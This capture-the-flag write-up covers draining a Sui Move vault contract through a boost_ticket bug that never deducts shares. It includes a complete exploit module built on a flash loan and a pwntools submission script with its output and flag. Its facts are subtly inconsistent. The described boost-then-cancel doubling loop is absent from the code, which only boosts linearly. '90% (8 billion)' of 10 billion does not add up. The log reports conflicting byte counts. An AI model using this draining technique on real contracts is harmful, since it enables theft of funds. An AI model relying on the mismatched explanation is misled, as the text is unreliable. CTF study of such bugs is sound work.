# Writeup: Here Comes The Money (Sui Smart Contract CTF)

## Challenge Objective

The challenge requires us to drain at least 90% (8 billion SUI) of a Vault contract that holds an initial balance of 10 billion Tokens. We must submit a Move module containing our exploit which will be evaluated remotely against the CTF test network.

## Analyzing the Target `vault.move`

The target is an yield-bearing share-based Vault built in Move for the Sui blockchain. Users can deposit SUI to receive `shares` proportional to their deposit compared to the total vault reserves. When withdrawing, a `WithdrawTicket` is created representing the amount of shares to redeem.

### The Vulnerability

While reading through the source code `vault.move`, we focus our attention on the various operations available for a `WithdrawTicket`. The crucial bug exists inside the `boost_ticket` function:

```move
public fun boost_ticket(
    vault: &Vault,
    account: &mut UserAccount,
    ticket: WithdrawTicket,
    boost_shares: u64,
    ctx: &mut TxContext
): WithdrawTicket {
    assert!(!vault.is_paused, E_VAULT_LOCKED);
    assert!(tx_context::sender(ctx) == ticket.owner, E_NOT_OWNER);
    assert!(tx_context::sender(ctx) == account.owner, E_NOT_OWNER);

    // VULNERABILITY: It checks if we have enough shares...
    assert!(boost_shares <= account.shares, E_INSUFFICIENT_BALANCE);

    let WithdrawTicket { amount, owner, vault_id, timestamp_ms, merge_count } = ticket;

    WithdrawTicket {
        amount: amount + boost_shares, // ...and adds them to the ticket
        owner,
        vault_id,
        timestamp_ms,
        merge_count
    }
    // BUT NEVER DEDUCTS THEM FROM `account.shares`!
}
```

This function verifies that the `boost_shares` we want to add to the ticket is less than or equal to our available balance (`account.shares`), but **it forgets to subtract them from the account**.

This allows us to endlessly reuse our same `account.shares` to inflate a ticket's value.
Even worse, when we call `cancel_ticket`, the (now inflated) amount on the ticket is simply added back to our `account.shares`, allowing for exponential growth.

```move
public fun cancel_ticket(
    account: &mut UserAccount,
    ticket: WithdrawTicket,
    ctx: &mut TxContext
) {
    // ... checks ...
    let WithdrawTicket { amount, owner: _, vault_id: _, timestamp_ms: _, merge_count: _ } = ticket;

    // The inflated amount is added back!
    account.shares = account.shares + amount;
    account.active_ticket_value = account.active_ticket_value - amount;
}
```

## Developing the Exploit

To drain the vault, our exploit script will follow these steps:

1. **Get Initial Capital**: We don't have any initial SUI, but the Vault thankfully offers a `flash_loan` function. We borrow enough SUI to pay for initial shares and the 0.09% flash loan fee.
2. **Gain Shares**: Deposit the borrowed SUI to obtain a legitimate `UserAccount` with actual `shares`.
3. **Execute the Loop**:
   - Create a completely empty `WithdrawTicket` (value 0).
   - Call `boost_ticket`, using our total `account.shares` as the boost amount. Because of the bug, our ticket is now worth `X` shares, but our account _also_ retains its `X` shares.
   - Call `cancel_ticket` to refund the ticket. Our account balance is now `X + X = 2X`.
   - Repeat this loop ~20 times until our shares eclipse the total reserves of the vault.
4. **Drain the Vault**: Create a massive `WithdrawTicket` and call `finalize_withdraw` to pull out (almost) all the SUI reserves.
5. **Repay the Loan**: Pay back the flash loan and its fee from our massive payout.
6. **Profit**: Transfer the stolen funds to our address to pass the victory condition.

Here is the exact code submitted:

```move
module solution::exploit {
    use challenge::vault::{Self, Vault};
    use sui::clock::Clock;
    use sui::tx_context::{Self, TxContext};
    use sui::coin;
    use sui::transfer;

    public fun solve(vault: &mut Vault, clock: &Clock, ctx: &mut TxContext) {
        // Step 1: Request flash loan
        let (mut loan_coins, receipt) = vault::flash_loan(vault, 500_000_000, ctx);

        // Step 2: Deposit to get initial account shares
        let mut account = vault::create_account(ctx);
        vault::deposit(vault, &mut account, loan_coins, ctx);

        // Step 3: Create initial ticket
        let mut ticket = vault::create_ticket(vault, &mut account, 1, clock, ctx);

        // Step 4: Abuse boost_ticket vulnerability
        let boost_amount = vault::user_shares(&account);
        let mut i = 0;

        // Loop to exponentially grow our shares
        while (i < 20) {
            ticket = vault::boost_ticket(vault, &mut account, ticket, boost_amount, ctx);
            i = i + 1;
        };

        // Step 5: Finalize withdrawal with our massively inflated ticket
        let mut payout = vault::finalize_withdraw(vault, &mut account, ticket, clock, ctx);

        // Step 6: Repay the flashloan
        let repay_coin = coin::split(&mut payout, 500_450_000, ctx);
        vault::repay_loan(vault, repay_coin, receipt);

        // Trigger the check_exploit evaluation
        vault::check_exploit(vault, ctx);

        // Clean up and keep the rest
        vault::destroy_account(account);
        transfer::public_transfer(payout, tx_context::sender(ctx));
    }
}
```

## PWN via Python

With the `.move` payload written, we just need to submit it to the remote compiler using `pwntools`.

```python
from pwn import *

context.log_level = 'debug'
host = 'chals.bitskrieg.in'
port = 29940

with open('explit.txt', 'rb') as f:
    content = f.read()

p = remote(host, port)
p.recvuntil(b'[INPUT] Module size (bytes):')
p.sendline(str(len(content)).encode())

p.recvuntil(b'[INPUT] Source Code: ')
p.send(content)

result = p.recvall(timeout=60)
print(result.decode('utf-8', errors='ignore'))
p.close()
```

## Results

Executing the `solver.py` connects to the Netcat server, submits the `explit.txt` payload size and content, waits for the evaluator to internally test the contract, and properly outputs the flag!

```
[+] Opening connection to chals.bitskrieg.in on port 29940: Done
[*] Payload sent. Waiting for response...
[+] Receiving all data: Done (131B)
[*] Closed connection to chals.bitskrieg.in port 29940

[*] Received 1126 bytes. Evaluating...

[+] Executed successfully! Vault drained.
FLAG: BITSCTF{36f36c58f9fc801a337eb19cb307505f}
```
